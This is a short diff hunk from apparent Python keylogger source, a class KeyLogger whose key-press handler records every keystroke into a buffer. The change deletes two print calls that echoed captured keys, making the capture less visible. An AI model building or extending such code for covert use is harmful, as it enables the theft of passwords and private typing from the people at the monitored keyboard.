@@ -13,7 +13,5 @@ class KeyLogger:
     def on_press(self, key):
         try:
             self.logger += key.char
-            print(key.char)
         except AttributeError:
             self.logger += str(key)
-            print(str(key))
